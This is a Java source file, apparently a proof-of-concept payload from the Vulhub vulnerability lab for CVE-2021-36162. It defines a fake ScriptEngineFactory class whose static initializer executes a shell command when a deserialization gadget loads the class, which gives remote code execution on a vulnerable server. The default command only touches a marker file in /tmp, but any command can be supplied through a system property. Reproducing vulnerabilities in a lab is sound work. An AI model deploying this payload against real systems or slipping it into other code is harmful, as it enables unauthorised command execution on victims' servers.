package org.vulhub.poc;

import javax.script.ScriptEngine;
import javax.script.ScriptEngineFactory;
import java.util.Collections;
import java.util.List;

public class SnakeYamlScriptEngineFactory implements ScriptEngineFactory {
    static {
        try {
            Runtime.getRuntime().exec(System.getProperty("org.vulhub.command", "touch /tmp/CVE-2021-36162-PWNED"));
        } catch (Exception ignored) {
        }
    }

    @Override
    public String getEngineName() {
        return "vulhub";
    }

    @Override
    public String getEngineVersion() {
        return "1.0";
    }

    @Override
    public List<String> getExtensions() {
        return Collections.emptyList();
    }

    @Override
    public List<String> getMimeTypes() {
        return Collections.emptyList();
    }

    @Override
    public List<String> getNames() {
        return Collections.singletonList("vulhub");
    }

    @Override
    public String getLanguageName() {
        return "vulhub";
    }

    @Override
    public String getLanguageVersion() {
        return "1.0";
    }

    @Override
    public Object getParameter(String key) {
        return null;
    }

    @Override
    public String getMethodCallSyntax(String obj, String method, String... args) {
        return null;
    }

    @Override
    public String getOutputStatement(String toDisplay) {
        return null;
    }

    @Override
    public String getProgram(String... statements) {
        return null;
    }

    @Override
    public ScriptEngine getScriptEngine() {
        return null;
    }
}
